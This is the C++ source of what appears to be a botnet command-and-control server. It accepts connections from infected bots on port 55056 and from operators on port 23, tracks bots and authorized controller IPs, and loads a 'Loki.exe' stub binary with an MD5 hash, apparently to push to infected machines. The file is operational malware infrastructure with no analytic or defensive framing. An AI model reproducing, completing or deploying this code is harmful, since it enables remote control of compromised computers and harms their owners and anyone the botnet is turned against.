#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <thread>
#include <vector>
#include <algorithm>
#include "control_client.h"
#include "controller_login.h"
#include "main.h"
#include <map>
#include "md5_lib_src.h"
#include "client.h"

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
// #pragma comment (lib, "Mswsock.lib")

#define BOT_CONNECT_PORT "55056"
#define CONTROL_CONNECT_PORT "23"

CRITICAL_SECTION bot_list_cs;


unsigned short bot_idx = 0;
bot_list_t bot_list;

CRITICAL_SECTION stub_data_cs;
std::vector<char> stub_data;
unsigned char stub_data_md5[16];

CRITICAL_SECTION authorized_ips_cs;
std::set<u_long> authorized_ips;

CRITICAL_SECTION excluded_bots_cs;
excluded_bot_list_t excluded_bots;

bool is_authorized_ip(u_long ip)
{
	EnterCriticalSection(&authorized_ips_cs);
	bool res = std::find(authorized_ips.begin(), authorized_ips.end(), ip) != authorized_ips.end();
	LeaveCriticalSection(&authorized_ips_cs);

	return res;
}

void authorize_ip(u_long ip)
{
	EnterCriticalSection(&authorized_ips_cs);
	authorized_ips.insert(ip);
	LeaveCriticalSection(&authorized_ips_cs);
}

void get_authorized_ips(std::set<u_long>* out_ips)
{
	out_ips->clear();
	EnterCriticalSection(&authorized_ips_cs);
	*out_ips = std::set<u_long>(authorized_ips);
	LeaveCriticalSection(&authorized_ips_cs);
}

void load_stub_data()
{
	EnterCriticalSection(&stub_data_cs);
	stub_data.clear();
	std::ifstream input(".\\Stub\\Loki.exe", std::ios::binary);
	if (!input.is_open())
		return;
	// copies all data into buffer
	stub_data = std::vector<char>((
		std::istreambuf_iterator<char>(input)),
		(std::istreambuf_iterator<char>()));

	MD5 md5;
	md5.MD5Encode(stub_data.data(), stub_data_md5, stub_data.size());
	LeaveCriticalSection(&stub_data_cs);
}

std::vector<char> get_stub_data(std::vector<char>* out_data)
{
	out_data->clear();
	std::vector<char> md5_rtn;
	EnterCriticalSection(&stub_data_cs);
	*out_data = std::vector<char>(stub_data);
	md5_rtn.assign(stub_data_md5, stub_data_md5 + 16);
	LeaveCriticalSection(&stub_data_cs);
	return md5_rtn;
}

void get_bot_list(bot_list_t* out_bot_list)
{
	out_bot_list->clear();
	EnterCriticalSection(&bot_list_cs);
	*out_bot_list = bot_list_t(bot_list);
	LeaveCriticalSection(&bot_list_cs);
}

void erase_bot_from_bot_list(client* bot)
{
	EnterCriticalSection(&bot_list_cs);
	for (auto it = bot_list.begin(); it != bot_list.end();)
	{
		if (it->second == bot)
			bot_list.erase(it++);
		else
			++it;
	}
	LeaveCriticalSection(&bot_list_cs);
}

void accept_bot_thread(SOCKET server_socket)
{
	do
	{

		SOCKET client_socket = accept(server_socket, NULL, NULL);
		if (client_socket == INVALID_SOCKET)
			continue;

		client* new_client = new client(client_socket);

		EnterCriticalSection(&bot_list_cs);
		bot_list[bot_idx++] = new_client;
		LeaveCriticalSection(&bot_list_cs);

	} while (server_socket != INVALID_SOCKET);
}

void accept_control_thread(SOCKET server_socket)
{
	do
	{

		SOCKET client_socket = accept(server_socket, NULL, NULL);
		if (client_socket == INVALID_SOCKET)
			continue;

		new control_client(client_socket);

	} while (server_socket != INVALID_SOCKET);
}

SOCKET init_new_listener_socket(char* port)
{

	int iResult;
	SOCKET ListenSocket = INVALID_SOCKET;

	struct addrinfo *result = NULL;
	struct addrinfo hints;


	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, port, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		exit(0);
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		exit(0);
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		exit(0);
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(0);
	}


	return ListenSocket;
}

void add_excluded_bot(unsigned long long hwid)
{
	EnterCriticalSection(&excluded_bots_cs);
	excluded_bots.push_back(hwid);
	LeaveCriticalSection(&excluded_bots_cs);
}

void remove_excluded_bot(unsigned long long hwid)
{
	if (std::find(whitelist_hwid.begin(), whitelist_hwid.end(), hwid) != whitelist_hwid.end())
		return;

	EnterCriticalSection(&excluded_bots_cs);
	excluded_bots.erase(std::find(excluded_bots.begin(), excluded_bots.end(), hwid));
	LeaveCriticalSection(&excluded_bots_cs);
}

void get_excluded_bots(excluded_bot_list_t& list)
{
	EnterCriticalSection(&excluded_bots_cs);
	list = excluded_bot_list_t(excluded_bots);
	LeaveCriticalSection(&excluded_bots_cs);
}

void init_excluded_bots()
{
	EnterCriticalSection(&excluded_bots_cs);
	excluded_bots.clear();
	
	for (auto& entry : whitelist_hwid)
		excluded_bots.push_back(entry);

	LeaveCriticalSection(&excluded_bots_cs);
}

int main(void)
{
	InitializeCriticalSection(&bot_list_cs);
	InitializeCriticalSection(&stub_data_cs);
	InitializeCriticalSection(&authorized_ips_cs);
	InitializeCriticalSection(&excluded_bots_cs);
	init_excluded_bots();


	load_stub_data();
	load_logins();
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	

	auto bot_thread = std::thread(accept_bot_thread, init_new_listener_socket(BOT_CONNECT_PORT));
	auto control_thread = std::thread(accept_control_thread, init_new_listener_socket(CONTROL_CONNECT_PORT));

	control_thread.join();

	return 0;
}
